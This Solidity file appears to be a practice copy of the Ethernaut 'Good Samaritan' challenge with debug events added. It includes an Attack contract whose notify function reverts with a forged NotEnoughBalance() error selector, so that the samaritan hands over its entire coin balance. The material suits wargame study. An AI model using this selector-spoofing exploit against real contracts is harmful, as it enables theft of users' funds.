// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

//import "openzeppelin-contracts-08/utils/Address.sol";
import "@openzeppelin/contracts/utils/Address.sol";


contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;
    event Entered(bytes _bytes);
    event EnteredIf(bytes _bytes);

    event Abi(bytes32 _bytes);
    event Keccak(bytes32 _bytes);
    event SamaritanRD(bool _bool);



    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            emit SamaritanRD(true);

            return true;
        } catch (bytes memory err) {
            emit Entered(err);
            emit Abi(keccak256(abi.encodeWithSignature("NotEnoughBalance()")));
            emit Keccak(keccak256(err));
            
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                
                emit EnteredIf(err);
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    event CoinNotify(bool _bool);

    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;
            emit CoinNotify(false);


            if(dest_.isContract()) {
                // notify contract 
                emit CoinNotify(true);
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {

    event WalletDonat10(bool _bool);
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    //error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        emit WalletDonat10(true);
        // check balance left
        if (coin.balances(address(this)) < 10) {
            //revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract Attack {

    GoodSamaritan samaritan;
    //error NotEnoughBalance(bool _bool);
    
    event AbiAttack (bytes _bytes);

    bytes32 public my_bytes;
    bytes32 public my_bytes_in;

    constructor (address _samaritan){
        samaritan = GoodSamaritan(_samaritan);
    }

    function notify (uint256 amount) public  {
        /*
        bytes memory message = abi.encodeWithSignature("NotEnoughBalance()");
        emit AbiAttack(message);
        revert NotEnoughBalance(true);
        //return keccak256(abi.encodeWithSignature("NotEnoughBalance()"));
        */
        if (amount == 10){
                assembly{
                let free_mem_ptr := mload(64)
                mstore(free_mem_ptr, 0xad3a8b9e00000000000000000000000000000000000000000000000000000000)
                revert(free_mem_ptr, 4)
            }
        }
       
    }

    function attack () public {
        bytes memory message = abi.encodeWithSignature("NotEnoughBalance()");
        emit AbiAttack(message);
        samaritan.requestDonation();
    }

    function myKeccak () public {
        my_bytes = keccak256(abi.encodeWithSignature("NotEnoughBalance()"));
    }

    function myKeccakIn (bytes calldata _bytes) public {
        my_bytes_in = keccak256(_bytes);
    }
}
